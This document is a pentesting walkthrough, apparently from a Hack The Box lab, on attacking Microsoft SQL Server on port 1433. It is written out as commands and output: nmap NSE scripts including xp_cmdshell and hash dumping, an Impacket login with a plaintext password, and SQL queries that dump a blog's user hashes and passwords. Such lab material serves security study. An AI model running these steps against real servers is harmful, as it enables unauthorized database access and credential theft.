# 1433 MSSQL

https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server

- [Enumeration](#enumeration)
    - [NSE](#nse)
- [Login with mssqlclient.py](#login-with-mssqlclientpy)
    - [Login](#mssqlclientpy-adminmql_s_pssw0rdip)
    - [Current Database](#current-database)
    - [Show All Databases](#show-all-databases)
    - [Change DB](#change-db)
    - [Find Tables](#find-tables)
    - [Getting Columns from a Table](#getting-columns-from-a-table)

## Enumeration
```sh
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
msf> use auxiliary/scanner/mssql/mssql_ping
```

### NSE
```sql
$ nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 $ip
Starting Nmap 7.94 ( https://nmap.org ) at 2023-09-23 23:30 EDT
Nmap scan report for 10.10.10.52
Host is up (0.014s latency).

Bug in ms-sql-dac: no string output.
Bug in ms-sql-hasdbaccess: no string output.
PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2014 12.00.2000.00; RTM
| ms-sql-dump-hashes: 
|_  10.10.10.52:1433: ERROR: Bad username or password
| ms-sql-empty-password: 
|_  10.10.10.52:1433: 
| ms-sql-tables: 
|   10.10.10.52:1433: 
|_[10.10.10.52:1433]
| ms-sql-xp-cmdshell: 
|_  (Use --script-args=ms-sql-xp-cmdshell.cmd='<CMD>' to change command.)
| ms-sql-ntlm-info: 
|   10.10.10.52:1433: 
|     Target_Name: HTB
|     NetBIOS_Domain_Name: HTB
|     NetBIOS_Computer_Name: MANTIS
|     DNS_Domain_Name: htb.local
|     DNS_Computer_Name: mantis.htb.local
|     DNS_Tree_Name: htb.local
|_    Product_Version: 6.1.7601
| ms-sql-info: 
|   10.10.10.52:1433: 
|     Version: 
|       name: Microsoft SQL Server 2014 RTM
|       number: 12.00.2000.00
|       Product: Microsoft SQL Server 2014
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
| ms-sql-config: 
|   10.10.10.52:1433: 
|_  ERROR: Bad username or password
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.49 seconds
```

## Login with mssqlclient.py

### mssqlclient.py admin:'m$$ql_S@_P@ssW0rd!'@$ip
12:26 mssqlclient.py admin:'m$$ql_S@_P@ssW0rd!'@$ip
```sql
$ mssqlclient.py admin:'m$$ql_S@_P@ssW0rd!'@$ip
Impacket v0.12.0.dev1+20230823.84619.912e896 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'master'.
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Microsoft SQL Server (120 7208) 
[!] Press help for extra shell commands
SQL (admin  admin@master)>
```

### Current Database
```sql
SQL (admin  admin@orcharddb)> SELECT DB_NAME()
---------   
orcharddb   
SQL (admin  admin@orcharddb)> 
```

### Show All Databases
13:12 SELECT name FROM master.dbo.sysdatabases
```sql
SQL (admin  admin@master)> SELECT name FROM master.dbo.sysdatabases
name        
---------   
master      
tempdb      
model       
msdb        
orcharddb   
SQL (admin  admin@master)> 
```

### Change DB
14:11 USE orcharddb
```sql
SQL (admin  admin@master)> USE orcharddb
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: orcharddb
[*] INFO(MANTIS\SQLEXPRESS): Line 1: Changed database context to 'orcharddb'.
SQL (admin  admin@orcharddb)>
```

### Find Tables
15:01 SELECT * FROM INFORMATION_SCHEMA.TABLES
```sql
SQL (admin  admin@orcharddb)> SELECT * FROM INFORMATION_SCHEMA.TABLES
TABLE_CATALOG   TABLE_SCHEMA   TABLE_NAME                                             TABLE_TYPE                                     
-------------   ------------   ----------------------------------------------------   ----------                                     
orcharddb       dbo            blog_Orchard_Blogs_RecentBlogPostsPartRecord           b'BASE TABLE'                                                 
orcharddb       dbo            blog_Orchard_Blogs_BlogArchivesPartRecord              b'BASE TABLE'                                                                    
orcharddb       dbo            blog_Orchard_Workflows_TransitionRecord                b'BASE TABLE'                                                                    
orcharddb       dbo            blog_Orchard_Workflows_WorkflowRecord                  b'BASE TABLE'                                                                    
orcharddb       dbo            blog_Orchard_Workflows_WorkflowDefinitionRecord        b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Workflows_AwaitingActivityRecord          b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Workflows_ActivityRecord                  b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Tags_TagsPartRecord                       b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Framework_DataMigrationRecord             b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Tags_TagRecord                            b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Tags_ContentTagRecord                     b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ContentFieldDefinitionRecord             b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Framework_DistributedLockRecord           b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ContentPartDefinitionRecord              b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ContentPartFieldDefinitionRecord         b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ContentTypeDefinitionRecord              b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ContentTypePartDefinitionRecord          b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ShellDescriptorRecord                    b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ShellFeatureRecord                       b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ShellFeatureStateRecord                  b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ShellParameterRecord                     b'BASE TABLE'   
orcharddb       dbo            blog_Settings_ShellStateRecord                         b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Framework_ContentItemRecord               b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Framework_ContentItemVersionRecord        b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Framework_ContentTypeRecord               b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Framework_CultureRecord                   b'BASE TABLE'   
orcharddb       dbo            blog_Common_BodyPartRecord                             b'BASE TABLE'   
orcharddb       dbo            blog_Common_CommonPartRecord                           b'BASE TABLE'   
orcharddb       dbo            blog_Common_CommonPartVersionRecord                    b'BASE TABLE'   
orcharddb       dbo            blog_Common_IdentityPartRecord                         b'BASE TABLE'   
orcharddb       dbo            blog_Containers_ContainerPartRecord                    b'BASE TABLE'   
orcharddb       dbo            blog_Containers_ContainerWidgetPartRecord              b'BASE TABLE'   
orcharddb       dbo            blog_Containers_ContainablePartRecord                  b'BASE TABLE'   
orcharddb       dbo            blog_Title_TitlePartRecord                             b'BASE TABLE'   
orcharddb       dbo            blog_Navigation_MenuPartRecord                         b'BASE TABLE'   
orcharddb       dbo            blog_Navigation_AdminMenuPartRecord                    b'BASE TABLE'   
orcharddb       dbo            blog_Scheduling_ScheduledTaskRecord                    b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_ContentPicker_ContentMenuItemPartRecord   b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Alias_AliasRecord                         b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Alias_ActionRecord                        b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Autoroute_AutoroutePartRecord             b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Users_UserPartRecord                      b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Roles_PermissionRecord                    b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Roles_RoleRecord                          b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Roles_RolesPermissionsRecord              b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Roles_UserRolesPartRecord                 b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Packaging_PackagingSource                 b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Recipes_RecipeStepResultRecord            b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_OutputCache_CacheParameterRecord          b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_MediaProcessing_ImageProfilePartRecord    b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_MediaProcessing_FilterRecord              b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_MediaProcessing_FileNameRecord            b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Widgets_LayerPartRecord                   b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Widgets_WidgetPartRecord                  b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Comments_CommentPartRecord                b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Comments_CommentsPartRecord               b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Taxonomies_TaxonomyPartRecord             b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Taxonomies_TermPartRecord                 b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Taxonomies_TermContentItem                b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Taxonomies_TermsPartRecord                b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_MediaLibrary_MediaPartRecord              b'BASE TABLE'   
orcharddb       dbo            blog_Orchard_Blogs_BlogPartArchiveRecord               b'BASE TABLE'   
SQL (admin  admin@orcharddb)> 
```

### Getting Columns from a Table
16:42 blog_Orchard_Users_UserPartRecord
```sql
SQL (admin  admin@orcharddb)> SELECT COLUMN_NAME 'All_Columns' FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='blog_Orchard_Users_UserPartRecord'
All_Columns
-------------------
Id
UserName
Email
NormalizedUserName
Password
PasswordFormat
HashAlgorithm
PasswordSalt
RegistrationStatus
EmailStatus
EmailChallengeToken
CreatedUtc
LastLoginUtc
LastLogoutUtc
SQL (admin  admin@orcharddb)>
```

### Getting Records from a table
```sql
SQL (admin  admin@orcharddb)> SELECT UserName,Password FROM blog_Orchard_Users_UserPartRecord
UserName   Password
--------   --------------------------------------------------------------------
admin      AL1337E2D6YHm0iIysVzG8LA76OozgMSlyOJk1Ov5WCGK+lgKY6vrQuswfWHKZn2+A==
James      J@m3s_P@ssW0rd!
SQL (admin  admin@orcharddb)>
```

### 
```sql

```

### 
```sql

```